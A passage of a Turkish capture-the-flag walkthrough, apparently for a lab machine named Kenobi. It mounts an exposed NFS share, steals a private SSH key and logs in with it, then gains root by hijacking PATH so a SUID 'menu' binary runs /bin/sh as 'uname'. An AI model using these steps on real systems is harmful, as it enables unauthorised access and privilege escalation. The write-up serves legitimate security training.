[[FTP]] de gösterildiği gibi id_rsa dosyamızı /var/tmp altına kopyaladık. [[RPC]] de /var klasörünün paylaşımda olduğunu görmüştük bu klasöre bağlanacağız. 

```
┌─[root@parrot]─[/mnt]
└──╼ #mkdir kenobiNFS
┌─[root@parrot]─[/mnt]
└──╼ #mount 10.10.30.127:/var /mnt/kenobiNFS/
┌─[root@parrot]─[/mnt]
└──╼ #ls kenobiNFS/tmp/
	id_rsa  
```


```
┌─[root@parrot]─[/mnt]
└──╼ #cp kenobiNFS/tmp/id_rsa /home/user/Desktop/Kenobi/
```

```
┌─[✗]─[root@parrot]─[/home/user/Desktop/Kenobi]
└──╼ #ls
id_rsa  log.txt  nmap.txt  prftp.py
┌─[root@parrot]─[/home/user/Desktop/Kenobi]
└──╼ #chmod 600 id_rsa 
```


```
┌─[root@parrot]─[/home/user/Desktop/Kenobi]
└──╼ #ssh -i id_rsa kenobi@10.10.30.127
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.8.0-58-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

103 packages can be updated.
65 updates are security updates.


Last login: Tue Oct 22 06:22:26 2024 from 10.11.106.146
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

kenobi@kenobi:~$ whoami
kenobi
```


Sistem üzerinde ayrıcalıklı olarak çalışan uygulamaları tespit etmek için aşağıda ki scripti kullanıyoruz 

`find / -perm -u=s -type f 2>/dev/null`

```
kenobi@kenobi:~$ find / -perm -u=s -type f 2>/dev/null
/sbin/mount.nfs
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/newuidmap
/usr/bin/gpasswd
/usr/bin/menu
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/at
/usr/bin/newgrp
/bin/umount
/bin/fusermount
/bin/mount
/bin/ping
/bin/su
/bin/ping6
```

Burada diğerlerinden farklı olan "/usr/bin/menu" . İçeriğine baktığımızda 

```
kenobi@kenobi:~$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :

```

böyle bir uygulmayla karşılaşıyoruz. Bazı fonksiyonları otomatize ve hızlı hale getirilme amaçlı yapılmış. 

strings komutu bize binary dosyasında okunabilir kelimeleri getirir. 

```
kenobi@kenobi:~$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :^C
kenobi@kenobi:~$ strings /usr/bin/menu
/lib64/ld-linux-x86-64.so.2
libc.so.6
setuid
__isoc99_scanf
puts
__stack_chk_fail
printf
system
__libc_start_main
__gmon_start__
GLIBC_2.7
GLIBC_2.4
GLIBC_2.2.5
UH-`
AWAVA
AUATL
[]A\A]A^A_
***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :
curl -I localhost
uname -r
ifconfig
 Invalid choice

```

Normalde "/usr/bin/uname -r " olarak çağırlması gerekirken kernel versiyonu direkt uname -r olarak çağrılmış. 


```
kenobi@kenobi:~$ echo /bin/sh > uname
kenobi@kenobi:~$ chmod 777 uname
kenobi@kenobi:~$ pwd
/home/kenobi
kenobi@kenobi:~$ export PATH=/home/kenobi:$PATH
kenobi@kenobi:~$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :2
# whoami
root
# 

```
